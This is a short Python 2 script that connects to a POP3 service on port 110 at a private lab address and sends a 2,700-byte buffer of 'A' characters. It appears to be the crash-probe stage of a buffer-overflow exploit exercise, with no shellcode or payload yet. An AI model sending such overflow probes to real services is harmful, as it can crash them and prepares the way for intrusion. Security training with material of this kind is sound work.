#!/usr/bin/python
import socket
import struct

#set up the IP and port to connect to
RHOST = "192.168.1.238" 
RPORT = 110

#set up the IP and port to connect to
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))

#build a message

buf = ""
buf += "A"*2700
buf += "\n"

#send the message
s.send(buf)

#print what we sent

print "Sent: {0}".format(buf)

#receive some data from socket
data = s.recv(1024)

#print out what received
print "Received: {0}".format(data)
